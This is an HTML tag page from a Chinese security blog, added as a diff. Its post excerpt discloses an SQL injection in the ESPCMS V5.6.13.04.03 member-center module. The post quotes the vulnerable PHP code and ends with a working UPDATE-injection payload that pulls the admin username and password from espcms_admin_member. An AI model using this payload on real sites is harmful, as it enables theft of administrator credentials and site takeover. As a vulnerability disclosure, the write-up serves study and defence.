@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>Tag: Espcms | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="home-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+<main class="content" role="main">
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2013-04-11T08:41:59.000Z" itemprop="datePublished">
+          2013-04-11
+      </time>
+    
+    
+    | 
+    <a href='/tag/漏洞/'>漏洞</a>,
+    
+    <a href='/tag/SQL注入/'>SQL注入</a>,
+    
+    <a href='/tag/Espcms/'>Espcms</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/989.seo/">易思ESPCMS企业网站管理系统V5.6.13.04.03的会员中心模块SQL注入漏洞</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p><a href="http://ha.cker.in/tag/Espcms" target="_blank">Espcms</a> <a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a><a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a> 第二弹     <br /><a href="http://team.f4ck.net/thread-10337-1-1.html">http://team.f4ck.net/thread-10337-1-1.html</a></p>  <p>   <br />易思<a href="http://ha.cker.in/tag/Espcms" target="_blank">ESPCMS</a>企业网站管理系统基于LAMP开发构建的企业网站管理系统。     <br />易思<a href="http://ha.cker.in/tag/Espcms" target="_blank">ESPCMS</a>企业网站管理系统V5.6.13.04.03的会员中心模块存在<a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a>漏洞，攻击者可利用此漏洞破坏应用，执行未授权操作。</p>  <p>漏洞文件: interface/membermain.php    <br /></p>  <pre>function in_save() {<br>                parent::start_pagetemplate();<br>                parent::member_purview();<br>                $lng = (admin_LNG == ‘big5’) ? $this-&gt;CON[‘is_lancode’] : admin_LNG;<br>                $inputclass = $this-&gt;fun-&gt;accept(‘inputclass’, ‘R’);<br>                $upurl = $this-&gt;fun-&gt;accept(‘upurl’, ‘R’);<br>                $userid = intval($this-&gt;fun-&gt;accept(‘userid’, ‘P’));<br>                $username = $this-&gt;fun-&gt;accept(‘username’, ‘P’);<br>                if (empty($userid) || empty($username)) {<br>                        $linkURL = $this-&gt;mlink[‘center’];<br>                        $this-&gt;callmessage($this-&gt;lng[‘member_edit_ok’], $linkURL, $this-&gt;lng[‘gobackurlbotton’]);<br>                }<br>                $email = trim($this-&gt;fun-&gt;accept(‘email’, ‘P’));<br>                $question = trim($this-&gt;fun-&gt;accept(‘question’, ‘P’, true, true));<br>                $answer = trim($this-&gt;fun-&gt;accept(‘answer’, ‘P’, true, true));<br>                $alias = trim($this-&gt;fun-&gt;accept(‘alias’, ‘P’, true, true));//通过一个accept函数,确定为post提交<br>                $sex = $this-&gt;fun-&gt;accept(‘sex’, ‘P’);//注得就是你了.$sex可控,<br>                $sex = empty($sex) ? 0 : $sex;<br>                $tel = trim($this-&gt;fun-&gt;accept(‘tel’, ‘P’, true, true));<br>                $mobile = trim($this-&gt;fun-&gt;accept(‘mobile’, ‘P’, true, true));<br>                $birthday = $this-&gt;fun-&gt;accept(‘birthday’, ‘P’);<br>                $birthday = empty($birthday) ? 0 : $this-&gt;fun-&gt;formatdate($birthday, 4);<br>                $country = intval($this-&gt;fun-&gt;accept(‘cityone’, ‘P’));<br>                $country = empty($country) ? 0 : $country;<br>                $province = intval($this-&gt;fun-&gt;accept(‘citytwo’, ‘P’));<br>                $province = empty($province) ? 0 : $province;<br>                $city = intval($this-&gt;fun-&gt;accept(‘citythree’, ‘P’));<br>                $city = empty($city) ? 0 : $city;<br>                $district = intval($this-&gt;fun-&gt;accept(‘district’, ‘P’));<br>                $district = empty($district) ? 0 : $district;<br>                $address = trim($this-&gt;fun-&gt;accept(‘address’, ‘P’, true, true));<br>                $zipcode = trim($this-&gt;fun-&gt;accept(‘zipcode’, ‘P’, true, true));<br>                $zipcode = empty($zipcode) ? 0 : $zipcode;<br>                $msn = trim($this-&gt;fun-&gt;accept(‘msn’, ‘P’, true, true));<br>                $qq = $this-&gt;fun-&gt;accept(‘qq’, ‘P’);<br>                $qq = empty($qq) ? 0 : $qq;<br><br>                $db_table = db_prefix . ‘member’;<br>                $db_table2 = db_prefix . ‘member_value’;</pre><br><br><p>下面来看看怎么进行入库处理的吧。<br>  <br />$db_where = ‘userid=’ . $userid;<br><br>  <br />$db_set= &quot;sex=$sex,birthday=$birthday,country=$country,province=$province,city=$city,district=$district,alias=’$alias’,address=’$address’,zipcode=$zipcode,tel=’$tel’,mobile=’$mobile’,qq=$qq,msn=’$msn’&quot;;<br><br>  <br />$this-&gt;db-&gt;query(‘UPDATE ‘ . $db_table . ‘ SET ‘ . $db_set . ‘ WHERE ‘ . $db_where);</p>
+
+<p>Update注入,看了下数据库,address为varchar。</p>
+
+<p>因为这个cms有个防报错的函数,构造遇到了点麻烦,一出错就显示Can not connect to Mysql server,<br>  <br />&#160;</p>
+
+<p>追踪下此函数:<br>  <br /></p>
+
+<pre>function halt($message = '', $sql = '') { 
+                $db_err = !db_err ? 0 : db_err; 
+                $db_sql = !db_sql ? 0 : db_sql; 
+                $mysqlinfo = '&lt;font size=&quot;2&quot;&gt;&lt;b&gt;ESPCMS SQL Error:&lt;/b&gt; Can not connect to MySQL server&lt;b&gt;Time:&lt;/b&gt;' . date('e Y-m-d H-i-s', time()); 
+                $mysqlinfo.= $db_sql ? '&lt;b&gt;SQL:&lt;/b&gt;' . $sql : ''; 
+                $mysqlinfo.= $db_err ? '&lt;b&gt;Error：&lt;/b&gt;' . mysql_error() : ''; 
+                $mysqlinfo.= '&lt;a target=&quot;_blank&quot; href=&quot;http://www.espcms.com&quot;&gt;http://www.espcms.com&lt;/a&gt; Access Query Errors&lt;/font&gt;'; 
+
+                exit($mysqlinfo); 
+        }</pre>
+
+<p>为了方便构造, 把出错的sql语句和出错的提示都打印出来。<br>  <br />sex=1,birthday=2013-04-02,country=0,province=0,city=0,district=0,alias=1,address=(select concat(username,CHAR(0x7c),password) from espcms_admin_member limit 1),zipcode=0,tel=0,mobile=0,qq=0,msn=0/<em>&amp;birthday=2013-04-02&amp;cityone=0&amp;citytwo=0&amp;citythree=0&amp;district=0&amp;address=12&amp;zipcode=0&amp;tel=&amp;mobile=&amp;msn=&amp;qq=</em>/</p><br>
+      
+      </p>
+      
+      <p>
+          <a href="/989.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <nav class="pagination" role="pagination">
+    
+    <span class="page-number">Page 1 of 1</span>
+    
+  </nav>
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
